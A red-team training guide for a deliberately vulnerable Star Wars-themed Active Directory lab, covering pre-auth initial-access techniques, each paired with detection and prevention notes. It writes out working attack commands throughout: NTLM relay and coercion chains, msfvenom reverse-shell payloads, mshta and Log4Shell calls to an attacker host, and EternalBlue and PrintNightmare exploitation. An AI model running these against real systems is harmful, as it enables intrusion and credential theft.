# 02a — Initial Access (IA-001..050)

**You are not domain-joined. You are not running Windows. You are a Kali / BlackArch / Parrot box on the host bridge** (`virbr1`, `10.10.0.1`), staring at `10.10.0.0/21`. No creds, no shells, no agent. This page is everything you can try *before* you have a user-equivalent foothold on the corp.

> The previous version of this lab framed `tatooine.empire.local` as the "attacker workstation." That's no longer the case — `tatooine` is a domain-joined **victim workstation** (phishing landing, lateral target, credential goldmine). Your tools live on **your own Kali**, not on `tatooine`.

```
┌─────────────────────────┐                            ┌──────────────────────────────┐
│   Kali / BlackArch      │   10.10.0.1  ─── virbr1 ─▶ │  empire.local 10.10.0.0/21      │
│   (your machine)        │                            │  coruscant, endor, scarif, kamino,   │
│   - impacket            │   10.20.0.1  ─── virbr2 ─▶ │  tatooine (victim)                │
│   - certipy             │                            ├──────────────────────────────┤
│   - nxc / netexec       │   10.30.0.1  ─── virbr3 ─▶ │  rebel.local 10.20.0.0/24   │
│   - mitm6 / Responder   │                            ├──────────────────────────────┤
│   - ntlmrelayx          │                            │  trade.corp 10.30.0.0/24       │
│   - Coercer / PetitPotam│                            └──────────────────────────────┘
│   - Sliver / Mythic C2  │
└─────────────────────────┘
```

You can run *every tool in the previous walkthroughs from Kali*. WinRM, SMB, LDAP, RPC, Kerberos, ADCS web enrollment, MSSQL, even DCOM are all reachable from a Linux client. The only times you'd want code on a Windows host are: (a) lab `tatooine` for OPSEC-realistic mimikatz testing, (b) executing post-exploitation `.exe`s you've already pushed.

---

## 0. Kali preparation (one-time)

```bash
sudo apt update
sudo apt install -y python3-impacket bloodhound bloodhound.py crackmapexec \
                    responder mitm6 hashcat hydra john \
                    smbclient enum4linux ldap-utils kerbrute \
                    proxychains4 freerdp2-x11 evil-winrm
pipx install netexec certipy-ad coercer
git clone https://github.com/topotam/PetitPotam.git
git clone https://github.com/Wh04m1001/DFSCoerce.git
git clone https://github.com/ly4k/PKINITtools.git
git clone https://github.com/dirkjanm/krbrelayx.git
```

Time-sync to the DC (Kerberos kills you on >5 min skew):
```bash
sudo chronyd -q "server 10.10.0.10 iburst"
# or
sudo rdate -n 10.10.0.10 || sudo ntpdate 10.10.0.10
```

Add a hosts entry so SPN names resolve (Kerberos *requires* hostnames):
```bash
sudo tee -a /etc/hosts <<EOF
10.10.0.10  coruscant.empire.local empire.local
10.10.0.11  deathstar.eu.empire.local eu.empire.local
10.10.0.12  endor.empire.local
10.10.0.13  scarif.empire.local
10.10.0.14  kamino.empire.local
10.10.0.100 tatooine.empire.local
10.20.0.10  yavin4.rebel.local rebel.local
10.30.0.10  neimoidia.trade.corp trade.corp
EOF
```

`krb5.conf` so Kerberos auth from Kali Just Works:
```bash
sudo tee /etc/krb5.conf <<'EOF'
[libdefaults]
    default_realm = empire.local
    dns_lookup_realm = true
    dns_lookup_kdc = true
    udp_preference_limit = 0

[realms]
    empire.local = {
        kdc = coruscant.empire.local
        admin_server = coruscant.empire.local
    }
    EU.empire.local    = { kdc = deathstar.eu.empire.local }
    rebel.local    = { kdc = yavin4.rebel.local }
    trade.corp        = { kdc = neimoidia.trade.corp }

[domain_realm]
    .empire.local        = empire.local
    empire.local         = empire.local
    .eu.empire.local     = EU.empire.local
    .rebel.local     = rebel.local
    .trade.corp         = trade.corp
EOF
```

Now you're ready to attack.

---

## Per-vector template

Every IA-XYZ writeup below follows the same shape:

```
### IA-XYZ — Title
What it is | Why it works in EMPIRE | Tools | Steps | Detection | Prevention
```

The IA series fills the gap between "lab is up" (`01-setup.md`) and "I have a domain user" (`02-recon.md` / `03-credential-access.md`). It is unapologetically pre-auth.

---

### IA-001 — Unauthenticated network sweep (host & service discovery)
**What it is:** map every host, port, and service on the lab subnets from your Kali. Foundation for everything else.
**Why it works in EMPIRE:** no NAC, no host-isolation, no segmentation between attacker bridge and lab.
**Tools:** `nmap`, `masscan`, `rustscan`, `netexec`.
**Steps:**
```bash
sudo nmap -sS -p- --min-rate 5000 10.10.0.0/21 -oA scan-tcp
sudo nmap -sU --top-ports 50 10.10.0.0/21       # find SNMP, DNS, NTP, NetBIOS, IKE
nxc smb 10.10.0.0/21                            # SMB version, signing, OS
nxc ldap 10.10.0.0/21                           # LDAP availability + naming context
```
**Detection:** IDS port-scan signatures; Windows Firewall logging Event `5152` blocked; Defender for Identity "reconnaissance using port scanning."
**Prevention:** segment by VLAN; restrict who can reach 88/135/389/445/5985 from non-corp networks; reduce service exposure surface.

---

### IA-002 — Anonymous SMB / null session enumeration
**What it is:** legacy SMB null bind exposes share lists, password policy, user/group enumeration on older configs.
**Why it works in EMPIRE:** Guest enabled, `RestrictAnonymous=0` on some hosts.
**Tools:** `smbclient`, `enum4linux-ng`, `rpcclient`, `nxc smb -u '' -p ''`.
**Steps:**
```bash
smbclient -L //10.10.0.10 -N
rpcclient -U "" -N 10.10.0.10
> querydominfo
> enumdomusers
> getdompwinfo
enum4linux-ng -A 10.10.0.13
nxc smb 10.10.0.0/24 -u '' -p '' --shares --users --pass-pol --rid-brute
```
**Detection:** Event `4625` from anonymous; `4798`/`4799` group enumeration; MDI "Reconnaissance using account enumeration."
**Prevention:** `RestrictAnonymous=2`, `RestrictAnonymousSAM=1`, disable Guest, SMB null sessions off.

---

### IA-003 — Anonymous LDAP bind
**What it is:** anonymous LDAP returns the rootDSE and (depending on `dsHeuristics`) parts of the directory tree.
**Why it works in EMPIRE:** default `dsHeuristics` allows anonymous rootDSE; `Pre-Windows 2000` group can give broader anon read.
**Tools:** `ldapsearch`, `windapsearch`.
**Steps:**
```bash
ldapsearch -x -H ldap://10.10.0.10 -b "" -s base "(objectclass=*)"   # rootDSE
ldapsearch -x -H ldap://10.10.0.10 -b "DC=empire,DC=local" -s sub "(objectclass=user)" sAMAccountName
windapsearch.py --dc-ip 10.10.0.10 -d empire.local --users
```
**Detection:** Event `2887` (LDAP anon binds); MDI alert on anonymous queries.
**Prevention:** `dsHeuristics`: 7th char `2` (no anonymous LDAP). Force LDAP signing.

---

### IA-004 — DNS recon (zone transfer + brute)
**What it is:** AD-integrated DNS often allows AXFR or anonymous queries.
**Why it works in EMPIRE:** AXFR enabled (REC-007).
**Tools:** `dig`, `dnsenum`, `dnsx`.
**Steps:**
```bash
dig @10.10.0.10 empire.local AXFR
dig @10.10.0.10 _ldap._tcp.dc._msdcs.empire.local SRV
dnsenum --dnsserver 10.10.0.10 empire.local
```
**Detection:** Event `6001` DNS AXFR.
**Prevention:** restrict zone transfers to named secondaries; disable AXFR.

---

### IA-005 — Username enumeration via Kerberos
**What it is:** the KDC returns different error codes for valid vs invalid principals when you request a TGT. Map valid usernames *without* a single failed-logon event on user accounts.
**Why it works in EMPIRE:** default Kerberos behaviour, no rate limiting.
**Tools:** `kerbrute userenum`.
**Steps:**
```bash
kerbrute userenum -d empire.local --dc 10.10.0.10 \
   /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -o valid_users.txt
```
**Detection:** Event `4768` with status `0x6` at burst rate; MDI "user enumeration with Kerberos."
**Prevention:** rare to mitigate without breaking Kerberos. Smart Lockout on the IdP side; detect with frequency anomaly.

---

### IA-006 — Kerbrute password spray (unauthenticated)
**What it is:** once you have a username list, spray a common password against the KDC. No NTLM event on the target host, low and slow.
**Why it works in EMPIRE:** lockout threshold = 0 (deliberate).
**Tools:** `kerbrute passwordspray`.
**Steps:**
```bash
kerbrute passwordspray -d empire.local --dc 10.10.0.10 valid_users.txt 'SithLord123!'
kerbrute passwordspray -d empire.local --dc 10.10.0.10 valid_users.txt "$(date +Summer%Y)!"
```
**Detection:** Event `4771` Kerberos pre-auth failed burst; MDI password spray.
**Prevention:** lockout threshold ≥ 5; smart lockout (Azure AD Password Protection); FIDO2.

---

### IA-007 — Guest account enabled on scarif
**What it is:** local Guest account enabled on a target host. This allows unauthenticated users to authenticate as Guest and access shares that permit guest access.
**Why it works in EMPIRE:** local `Guest` account is enabled on `scarif.empire.local` (`10.10.0.13`) with `PasswordNeverExpires` set to `$true`.
**Tools:** `smbclient`, `netexec`, `rpcclient`.
**Steps:**
```bash
# Verify guest access to shares
nxc smb 10.10.0.13 -u 'Guest' -p '' --shares
# List files anonymously/as guest
smbclient -L //10.10.0.13 -U 'Guest' -N
```
**Detection:** Security Event `4624` (Successful Logon) with Logon Type `3` (Network) and TargetUserName `Guest`.
**Prevention:** Disable the local Guest account (`Disable-LocalUser -Name "Guest"`). Ensure `RestrictAnonymous` is configured appropriately.

---

### IA-008 — LLMNR / NBT-NS / mDNS poisoning (Responder)
**What it is:** Windows hosts that fail a DNS lookup broadcast over LLMNR (UDP 5355), NBT-NS (UDP 137), or mDNS (UDP 5353). Answer the broadcast → victim authenticates to you → NTLMv2 hash → crack or relay.
**Why it works in EMPIRE:** intentional — LLMNR + NBT-NS left on; no DNS suffix search list.
**Tools:** `Responder` (Kali default).
**Steps:**
```bash
sudo responder -I virbr1 -wd
# wait for a victim mistyping a host name or auto-resolving wpad/proxy/printers
# captured hashes go to /usr/share/responder/logs/Responder-Session.log
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```
**Detection:** MDI "LLMNR/NBT-NS Spoofing"; Sysmon Event `22` (unusual DNS).
**Prevention:** GPO disable LLMNR + NBT-NS; deploy DNS suffix search list; egress filter on UDP 5355/137.

---

### IA-009 — mitm6 (IPv6 stack abuse from external)
**What it is:** Windows always prefers IPv6 and asks for DHCPv6 on boot. You answer first → become the IPv6 DNS server → serve a `wpad.dat` → every browser uses you as proxy → catch NTLM → relay to LDAPS for delegation/group adds.
**Why it works in EMPIRE:** IPv6 enabled, no RA-Guard / DHCPv6-Guard.
**Tools:** `mitm6`, `ntlmrelayx.py`.
**Steps:**
```bash
sudo mitm6 -i virbr1 -d empire.local --ignore-nofqdn
# parallel terminal:
sudo ntlmrelayx.py -6 -t ldaps://coruscant.empire.local -wh attacker.empire.local \
   --delegate-access -smb2support
# wait for a Windows host to ask for DHCPv6 (usually within seconds of any reboot or NIC bounce)
```
Outcome: ntlmrelayx writes RBCD on the victim's machine object → you can S4U2Self for any user to that machine → SYSTEM.
**Detection:** unsolicited DHCPv6 advertisements; new IPv6 default gateway in netsh; MDI "Suspected NTLM relay."
**Prevention:** disable IPv6 on workstations OR deploy RA-Guard + DHCPv6-Guard at switch level; disable WPAD; LDAP signing + channel binding.

---

### IA-010 — IPv6 link-local recon
**What it is:** even without DHCPv6, Windows speaks IPv6 link-local — `ping6 ff02::1` reveals every host on the segment, including ones that hide from IPv4 scans.
**Tools:** `ping6`, `ip -6 neigh`, `nmap -6`.
**Steps:**
```bash
ping6 -I virbr1 ff02::1 -c 4
ip -6 neigh
sudo nmap -6 -sS -p445,3389,5985 -PS ff02::1%virbr1
```
**Detection:** ICMPv6 echo bursts.
**Prevention:** RA-Guard; IPv6 disabled where unused.

---

### IA-011 — Unauthenticated MSSQL (SQL Browser + xp_cmdshell)
**What it is:** SQL Server Browser broadcasts instance metadata on UDP 1434; weak `sa` or sysadmin = `xp_cmdshell` = SYSTEM on the SQL host. Trust links across instances spider the chain.
**Why it works in EMPIRE:** SQL Browser on, `sa` enabled, mixed-mode auth.
**Tools:** `nxc mssql`, `impacket-mssqlclient`, `PowerUpSQL`.
**Steps:**
```bash
nxc mssql 10.10.0.0/24 --gen-relay-list relays.txt
nxc mssql 10.10.0.14 -u sa -p 'EmpireLab2024!' --local-auth -x whoami
impacket-mssqlclient sa:'EmpireLab2024!'@10.10.0.14
SQL> EXEC xp_cmdshell 'whoami'
SQL> EXEC sp_linkedservers
SQL> EXEC ('xp_cmdshell ''whoami''') AT [LINKED.SERVER]
```
**Detection:** SQL audit log; failed login bursts; MDI MSSQL recon.
**Prevention:** Windows auth only; disable SQL Browser; disable `xp_cmdshell`; least-priv service accounts.

---

### IA-012 — ADCS web enrollment unauth recon
**What it is:** `/certsrv/` and `/certsrv/certfnsh.asp` often answer pre-auth or with anon HTTP. Combined with ESC8, the next step is relay; but as plain recon you confirm the CA's hostname, the templates, and the auth scheme.
**Tools:** `curl`, `Certipy find -scheme http`.
**Steps:**
```bash
curl -i http://endor.empire.local/certsrv/
curl -i http://endor.empire.local/certsrv/certfnsh.asp
certipy find -u peter.parker -p '<later>' -dc-ip 10.10.0.10 -vulnerable    # post-auth
```
**Detection:** IIS access logs to `/certsrv/`; baseline who hits it.
**Prevention:** require HTTPS; disable NTLM on web enrollment; EPA; restrict via firewall.

---

### IA-013 — PetitPotam / DFSCoerce unauthenticated coercion
**What it is:** **CRITICAL.** `EfsRpcOpenFileRaw` (MS-EFSRPC) over SMB can be triggered by *anonymous* RPC against unpatched Windows. No domain creds needed. Coerce DC$ → relay to ADCS → cert for DC$ → DCSync. This is the single most powerful initial-access primitive in EMPIRE.
**Why it works in EMPIRE:** EFSRPC reachable, no auth on the named pipe, ADCS web HTTP+NTLM, no EPA.
**Tools:** `PetitPotam.py`, `Coercer`, `ntlmrelayx.py`.
**Steps:**
```bash
# 1. Relay listener on Kali
sudo ntlmrelayx.py -t http://endor.empire.local/certsrv/certfnsh.asp \
   --adcs --template DomainController -smb2support

# 2. Coerce coruscant unauthenticated (no -u/-p)
python3 PetitPotam.py -d '' -u '' -p '' 10.10.0.1 10.10.0.10
# 'unauthenticated' path uses anonymous EFSRPC handle
```
If the box is patched against pre-auth coercion, fall back to authenticated coercion with any low-priv creds (`Coercer.py coerce ...`).
Outcome: a base64 cert for coruscant$. `certipy auth` → TGT → DCSync.

**Detection:** MDI "PetitPotam coercion"; ADCS Event `4886`/`4887` with cert for DC$ issued to non-DC requester; Sysmon `3` outbound NTLM from DC$.
**Prevention:** patch ADV210003 + KB5005413; **disable NTLM on ADCS web enrollment, force HTTPS + EPA**; RPC filter for `MS-EFSRPC`.

---

### IA-014 — ShadowCoerce / DFSCoerce / PrinterBug (variants)
**What it is:** family of unauthenticated/low-auth coerce primitives — `MS-FSRVP`, `MS-DFSNM`, `MS-RPRN`. Each is a different RPC interface; mitigation is per-interface.
**Tools:** `Coercer` (one tool, all vectors).
**Steps:**
```bash
python3 Coercer.py scan -u '' -p '' -t 10.10.0.10 -l 10.10.0.1
python3 Coercer.py coerce -u '' -p '' -t 10.10.0.10 -l 10.10.0.1 --filter-method-name EfsRpcOpenFileRaw
```
**Detection:** RPC pattern signatures (MDI); SMB outbound from coerced host.
**Prevention:** RPC filters (KB5005413), disable Spooler/DFS/FSRVP where unused.

---

### IA-015 — ZeroLogon (CVE-2020-1472) pre-auth
**What it is:** unauthenticated Netlogon attack — set the DC's machine password to empty, then DCSync as `coruscant$`. Already documented as DF-035 but listed here because it is *pre-auth* and a true initial-access primitive.
**Tools:** `zerologon_tester.py`, `cve-2020-1472-exploit.py`.
**Steps:** see DF-035. **Always restore the original DC$ password with `reinstall_original_pw.py` before leaving** — otherwise SYSVOL/AD replication breaks.
**Detection:** MDI native; Event `5827`.
**Prevention:** patch + `FullSecureChannelProtection=1`.

---

### IA-016 — PrintNightmare (CVE-2021-34527) unauthenticated
**What it is:** with any low-priv domain creds (or sometimes anon if Point-and-Print is loose) call `RpcAddPrinterDriverEx` to load a DLL as SYSTEM on every spooler. Pre-auth variant exists where Point-and-Print is set to "no admin needed for new drivers."
**Tools:** `cve-2021-1675.py`, `PrintNightmare.py`, `SharpPrintNightmare.exe`.
**Steps:**
```bash
sudo smbserver.py -smb2support share /tmp/dll
# craft addprinter.dll that runs 'net user evil P@ss /add /domain'
python3 cve-2021-1675.py empire.local/peter.parker:'EmpireLab2024!'@10.10.0.10 '\\10.10.0.1\share\addprinter.dll'
```
**Detection:** Event `316` PrintService driver-installed; Sysmon `7` DLL load by `spoolsv.exe`.
**Prevention:** patch; disable Print Spooler on DCs and servers that don't print; `RestrictDriverInstallationToAdministrators=1`.

---

### IA-017 — EternalBlue / SMBGhost
**What it is:** MS17-010 (EternalBlue, SMBv1) and CVE-2020-0796 (SMBGhost, SMBv3 compression). True pre-auth RCE on unpatched Windows. EMPIRE's base image is patched against these by default, but the Ansible role can re-enable SMBv1 for legacy interop drills.
**Tools:** `metasploit ms17_010_eternalblue`, `nmap --script smb-vuln-ms17-010`, `smbghost-poc`.
**Steps:**
```bash
nmap --script smb-vuln-ms17-010 -p445 10.10.0.0/24
nxc smb 10.10.0.0/24 -M ms17-010
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.10.0.13; run"
```
**Detection:** Suricata/Snort ET rules; Sysmon `3` outbound SMB from non-MS-signed proc.
**Prevention:** disable SMBv1 (`sc config lanmanserver SMB1=0`); patch (March 2017 MS17-010, March 2020 CVE-2020-0796).

---

### IA-018 — Exchange ProxyShell / ProxyNotShell / ProxyLogon (pre-auth chain)
**What it is:** Exchange OWA/ECP pre-auth RCE chains. Not deployed in default EMPIRE topology but listed because PLAN.md §12 documents Exchange as an optional add-on.
**Tools:** `proxyshell.py`, `proxylogon.py`, `Sliver/CS Exchange profile`.
**Steps (representative):**
```bash
python3 proxyshell.py 10.10.0.50 administrator@empire.local
```
**Detection:** IIS log signatures (autodiscover.json with strange chars); Defender for Exchange; MDI.
**Prevention:** patch Exchange CU; isolate Exchange; certificate-based auth on OWA.

---

### IA-019 — Phishing: macro / VBA payload
**What it is:** classic. `.docm` / `.xlsm` with AutoOpen macro → shell. Delivered via email to a corp user (lab user account on `tatooine`). EMPIRE ships `tatooine` with Office disabled by default; install LibreOffice or trigger via `mshta` instead.
**Tools:** `msfvenom`, `macro_pack`, `EvilClippy`, Sliver/Mythic implant generator.
**Steps:**
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.0.1 LPORT=443 -f vba -o macro.vba
# embed in .docm via macro_pack or manually
# deliver via fake e-mail / share drop on \\scarif\Public
```
**Detection:** Office AMSI; Sysmon `1` `winword.exe`→`powershell.exe`/`mshta.exe`/`wmic.exe`; ASR rules.
**Prevention:** "Block all Office apps from creating child processes" ASR; Mark-of-the-Web on downloads; Application Guard for Office; macros disabled by default (Microsoft post-2022 default).

---

### IA-020 — Phishing: LNK / SCF / URL on writable share
**What it is:** drop `boring-report.lnk` on `\\scarif\Public` (Authenticated Users write). The `.lnk`'s `IconLocation` is `\\attacker\share\icon.ico` → any user *who simply opens the folder* triggers an NTLM auth to you. Captures, sometimes relays.
**Tools:** `ntlm_theft.py`, `lnk-template`.
**Steps:**
```bash
git clone https://github.com/Greenwolf/ntlm_theft
python3 ntlm_theft.py --generate all --server 10.10.0.1 --greedy
cp generated/*.lnk /tmp/landing/
smbclient //10.10.0.13/Public -U 'corp\peter.parker%EmpireLab2024!' -c 'put boring-report.lnk'
sudo responder -I virbr1 -wd
```
**Detection:** Sysmon `11` for `.lnk`/`.url`/`.scf` create; SMB `5145` for share writes; egress UDP 137/445 to attacker IP.
**Prevention:** egress block 445; SMB signing; remove write on shared folders; CASB.

---

### IA-021 — Phishing: HTML / browser-in-browser / OAuth consent
**What it is:** fake OAuth consent screen prompting the user to authorize "Microsoft 365 Admin Tools" → consent grant → token in your hand. Or BitB pixel-perfect rendering of a Microsoft logon prompt that submits creds to your server.
**Tools:** `evilginx2`, `Modlishka`, `BitB-template`.
**Steps:** stand up evilginx2 on Kali, configure for `login.microsoftonline.com` phishlet, deliver link.
**Detection:** anomalous Conditional Access sign-ins; new OAuth consents (audit log "Consent to application"); FIDO failure to non-FIDO MFA.
**Prevention:** disable user consent for new apps; require admin approval; phishing-resistant MFA (FIDO2).

---

### IA-022 — Phishing: HTA / mshta
**What it is:** `.hta` files run JScript/VBS via `mshta.exe` (signed Microsoft binary, LOLBIN). Easy initial RCE if user clicks.
**Tools:** `msfvenom -f hta-psh`, `Nishang Out-HTA`.
**Steps:**
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.0.1 LPORT=443 -f hta-psh -o evil.hta
python3 -m http.server 8080
# trick a user to: mshta http://10.10.0.1:8080/evil.hta
```
**Detection:** Sysmon `1` `mshta.exe` from email client / browser; ASR rule "Block JavaScript/VBScript launching downloaded content."
**Prevention:** block `mshta.exe` via WDAC/AppLocker; remove the file association.

---

### IA-023 — Phishing: ISO / IMG / LNK-in-archive (Mark-of-the-Web bypass)
**What it is:** ISO/IMG containers strip MOTW when extracted, so the inner `.lnk` that runs `cmd.exe /c powershell -enc ...` runs without SmartScreen prompt.
**Tools:** `mkisofs`, custom packaging.
**Steps:**
```bash
mkdir delivery && cp evil.lnk shipping_note.docx delivery/
genisoimage -V "Invoice" -o invoice.iso delivery/
# deliver via email
```
**Detection:** EDR detects ISO mount in user session; Sysmon `1` `cmd.exe`/`powershell.exe` from removable drive.
**Prevention:** Microsoft's MOTW-on-extract update; group-policy disable ISO/IMG mounting for users.

---

### IA-024 — `.library-ms` / `.url` archive NTLM leak (CVE-2025-24071)
**What it is:** craft a `.library-ms` file with an attacker UNC; Explorer auto-resolves on archive extract → NTLMv2 leak. Documented in CRED-051 but listed here as a stand-alone *initial* access vector — the victim never had to click anything.
**Tools:** `LibraryMS-Generator`, `Responder`.
**Steps:**
```bash
cat > evil.library-ms <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\10.10.0.1\share</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
EOF
zip evil.zip evil.library-ms
sudo responder -I virbr1 -wd
```
**Detection:** MOTW + Explorer auto-resolve patterns; EDR signature.
**Prevention:** patch March 2025; SMB egress filter; SMB signing.

---

### IA-025 — VPN / SSL-VPN / Citrix unauthenticated CVEs
**What it is:** Fortinet (CVE-2022-42475, CVE-2024-21762), Citrix (CVE-2023-3519), Pulse Secure (CVE-2024-21887), Ivanti (CVE-2024-21893). Most engagements *start* here. EMPIRE doesn't host one by default but the playbook is identical.
**Tools:** CVE-specific PoCs; `nuclei` templates.
**Detection:** vendor IDS sigs; CVE-specific log signatures.
**Prevention:** patch — these get a TLP:RED advisory and exploitation within hours.

---

### IA-026 — Public-facing web RCE / ViewState / Log4Shell
**What it is:** ASP.NET ViewState deserialization (CVE-2017-9248-style with stolen `MachineKey`), Log4Shell (`${jndi:ldap://...}`), Spring4Shell, JNDI, deserialization gadgets. If the lab includes IIS or a custom .NET app, hit it.
**Tools:** `ysoserial.net`, `log4shell-scanner`, `nuclei`, `ViewStateExploitTool`.
**Steps (Log4Shell representative):**
```bash
java -jar marshalsec.jar LDAPRefServer "http://10.10.0.1:8888/#Exploit"
curl 'http://app.empire.local/login?username=${jndi:ldap://10.10.0.1:1389/Exploit}'
```
**Detection:** WAF JNDI signature; outbound LDAP to attacker; Sysmon `3` from Java/IIS worker; Defender for Cloud Apps.
**Prevention:** patch; egress filtering from app servers; remove serialization gadgets; ASP.NET ViewState MAC mandatory.

---

### IA-027 — RDP brute-force + Sticky-Keys (offline media)
**What it is:** RDP on 3389 from outside → brute or steal session. With physical media access, boot Linux, replace `sethc.exe` (Sticky Keys backdoor PER-003) — full SYSTEM cmd on lock screen.
**Tools:** `hydra`, `crowbar`, `xfreerdp`, live-USB.
**Steps:**
```bash
hydra -L users.txt -P passwords.txt rdp://10.10.0.100 -t 4
```
**Detection:** Event `4625` Logon Type 10 spray; geo-anomaly on RDP.
**Prevention:** Network Level Authentication (NLA); FIDO2; RDP behind VPN; BitLocker prevents offline sticky-keys backdoor.

---

### IA-028 — USB drop / BadUSB / Rubber Ducky
**What it is:** drop a USB labelled "Payroll Q3" — user inserts → autorun (rare today) or HID-emulating device (Ducky/BashBunny) types a PowerShell payload at hardware speed.
**Tools:** `Rubber Ducky`, `BashBunny`, `Flipper Zero`, `Hak5 OMG cable`.
**Detection:** Sysmon `9` HID device added; PowerShell logging.
**Prevention:** USB control policy (block HID class on managed endpoints); Constrained Language Mode; ASR "Block executable files running unless they meet a prevalence, age, or trusted list criterion."

---

### IA-029 — SCCM PXE Boot abuse
**What it is:** SCCM Operating System Deployment over PXE serves a boot image and a task sequence — if it doesn't require a PXE password, you can extract NAA credentials from the task sequence variables. Pre-auth, network-only.
**Tools:** `PXEThief`, `sccmwtf`, `sccmhunter pxe`.
**Steps:**
```bash
python3 PXEThief.py 4    # interactive workflow
```
**Detection:** SCCM site server logs; abnormal PXE boots; KB5009546 deny list.
**Prevention:** require PXE password; isolate PXE network; disable NAA (use enhanced HTTP/PKI).

---

### IA-030 — VLAN hop / Cisco discovery + DTP
**What it is:** if you plug into a trunk port (some lab variants), DTP negotiation makes the switch trust you with all VLANs. Then 802.1Q-tagged frames let you talk to internal-only VLANs.
**Tools:** `yersinia`, `scapy`, `vlan_hopper.py`.
**Steps:**
```bash
sudo yersinia -G            # GUI; DTP attack
sudo vconfig add eth0 10    # then attack VLAN 10
```
**Detection:** switch interface logs; DTP packets from unauthorized port.
**Prevention:** disable DTP on every access port; assign access VLAN explicitly; no native VLAN = 1.

---

### IA-031 — Watering hole / drive-by (chrome/edge 0-day or N-day)
**What it is:** compromise a site the corp visits, serve browser exploit. N-day Chromium/Edge bugs are still effective if patching lags.
**Tools:** Metasploit `browser_autopwn2`; commercial frameworks.
**Detection:** EDR exploit-mitigation signal; Microsoft Defender for Endpoint network protection.
**Prevention:** managed-browser policy; Smart App Control; Application Guard for Office/Edge.

---

### IA-032 — Cloud / Entra ID device-code phishing
**What it is:** request a device code from Microsoft (`/oauth2/devicecode`), send the code to the user with social engineering ("paste this code to access HR portal"), they authenticate, you get tokens — bypasses traditional MFA on first-party clients.
**Tools:** `TokenTactics`, `roadtools`, `AzureHound`.
**Steps:**
```powershell
Import-Module TokenTactics
$tokens = Invoke-DeviceCodeFlow -Resource "https://graph.microsoft.com"
# user opens the URL, enters the code -> you get refresh+access tokens
```
**Detection:** Entra sign-in log "Device Code" flow from unusual IP; Conditional Access "block unfamiliar sign-in properties."
**Prevention:** Conditional Access — block Device Code flow except where required; FIDO2; restrict OAuth consents.

---

### IA-033 — Implant delivery + C2 stand-up (Sliver / Mythic / Havoc)
**What it is:** once any IA path lands, you want a stable agent, not a one-shot reverse shell. Stand up an open-source C2 framework on Kali — encrypted, with profile + obfuscation.
**Tools:** `Sliver`, `Mythic`, `Havoc`, `Nighthawk` (commercial).
**Steps:**
```bash
# Sliver
sliver-server
> generate --http 10.10.0.1 --os windows --arch amd64 --save /tmp/i.exe
> http
# deliver i.exe via IA-019/020/022/023
```
**Detection:** EDR memory scanning; Sysmon `3` to non-corp IPs; JA3/JA4 TLS fingerprinting.
**Prevention:** EDR with behavioural rules; egress filter (only allow proxy); TLS inspection where lawful.

---

## IA-034..050 — Additional surfaces enabled by the ENUM-surface playbook

These vectors became reachable once `ansible/tasks/vuln-enum-surface.yml`
runs (Phase 6.4 of `site.yml`). If you're on an older deployment that
predates that file, re-run Ansible — none of these will work otherwise.

### IA-034 — SNMP public/private community read + write

`public` (RO) and `private` (RW) are configured on every server.
`private` lets you push registry values via `snmpset`.

```bash
# Identify SNMP hosts:
nmap -sU -p161 --open 10.10.0.0/21
# Walk system tree:
snmpwalk -v2c -c public 10.10.0.13                          # scarif
snmpwalk -v2c -c public 10.10.0.10 1.3.6.1.4.1.77.1.2.25    # SAM/users (LanMan MIB)
snmpwalk -v2c -c public 10.10.0.13 1.3.6.1.4.1.77.1.2.27    # Shares
snmpwalk -v2c -c public 10.10.0.13 1.3.6.1.2.1.25.4.2.1.2   # Running processes
# Anything interesting → escalate to write:
snmpset -v2c -c private 10.10.0.13 1.3.6.1.2.1.1.5.0 s pwned
```
**Why it bites:** community strings travel cleartext UDP. From there you have
a credential-equivalent into the registry on the entire server fleet.
**Detection:** Sysmon UDP 161 from non-mgmt subnets; Windows Event Log SNMP service.
**Prevention:** SNMPv3 with auth+priv; remove `public`/`private`; restrict `PermittedManagers`.

---

### IA-035 — Anonymous FTP read on `scarif`

IIS `Web-Ftp-Server` is installed on scarif. If anonymous is permitted (lab default), you can pull whatever the FTP root exposes.

```bash
ftp 10.10.0.13               # USER anonymous, PASS anything
nmap --script ftp-anon,ftp-syst -p21 10.10.0.13
# Recursive grab:
wget -r ftp://anonymous:x@10.10.0.13/
```
**Detection:** IIS FTP log `u_exYYMMDD.log`; AccessDenied audits.
**Prevention:** Disable `Web-Ftp-Server` or require auth.

---

### IA-036 — Telnet brute on `scarif`

`TlntSvr` runs on scarif (legacy enum practice).

```bash
nmap -p23 --script telnet-encryption,telnet-brute 10.10.0.13
hydra -L users.txt -P passwords.txt telnet://10.10.0.13 -t4
```
**Detection:** Security 4625 on scarif; high TCP/23 connection rate.
**Prevention:** Don't ship Telnet. Use SSH.

---

### IA-037 — Anonymous NFS export read/write on `scarif`

`C:\NFSExport` is shared as `EMPIRE_NFS` with `EnableAnonymousAccess $true` and `Permission readwrite`. This is the Windows equivalent of `no_root_squash`.

```bash
showmount -e 10.10.0.13
mkdir /mnt/empire_nfs && sudo mount -t nfs 10.10.0.13:/EMPIRE_NFS /mnt/empire_nfs
echo 'pwn' > /mnt/empire_nfs/test.txt
# Plant a malicious LNK or .scf to trigger an NTLM leak when an admin browses
```
**Detection:** NFS log on scarif; unfamiliar source IPs reading exports.
**Prevention:** Don't expose Windows NFS to untrusted networks; require kerberos auth.

---

### IA-038 — SMB1 / EternalBlue on `scarif`

SMB1 is enabled **only** on scarif (deliberately gated so the rest of the lab isn't one-shotted). Practise the classic without nuking the lab.

```bash
nmap -p445 --script smb-protocols 10.10.0.13            # confirm SMB1 advertised
nmap -p445 --script smb-vuln-ms17-010 10.10.0.13
msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.10.0.13; set LHOST 10.10.0.1; run'
```
**Detection:** Sysmon SMB1 dialect negotiation; ETW SMBServer.
**Prevention:** `Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol`.

---

